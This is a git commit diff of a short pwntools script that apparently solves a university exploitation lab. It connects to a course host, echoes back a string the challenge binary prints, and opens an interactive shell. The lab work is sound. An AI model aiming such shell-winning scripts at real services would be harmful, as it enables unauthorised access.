f0d80ed157a4fd58b5a6c996087d0bc6e72fb440
Joshua Bartholomew <joshua.bartholomew@trojans.dsu.edu>
2023-08-24 19:22:12 -0500

    Updated with final functionality

--- lab1-1.py
+++ lab1-1.py
@@ -1,7 +1,20 @@
 import pwn
 
 if __name__ == "__main__":
-    local_victim_process = pwn.process("./lab1-1.bin")
+    
+    # Creating a tube to run the binary to "exploit"
+    # The first option is for testing a local binary; the second is for running against a remote service
+    # victim_binary = pwn.process("./lab1-1.bin")
+    victim_binary = pwn.remote("csc748.hostbin.org", 7011)
 
-    victim_process_standard_output = local_victim_process.recv()
-    print(victim_process_standard_output)
+    # Read and drop the introductory text printed to the screen by the binary
+    victim_binary.recvuntil(b"\n\n")
+
+    # Read and save the string given which will win a shell
+    shell_winning_string = victim_binary.recv(15)
+
+    # Return the shell winning string to the binary
+    victim_binary.sendline(shell_winning_string)
+
+    # Drop into a shell
+    victim_binary.interactive()
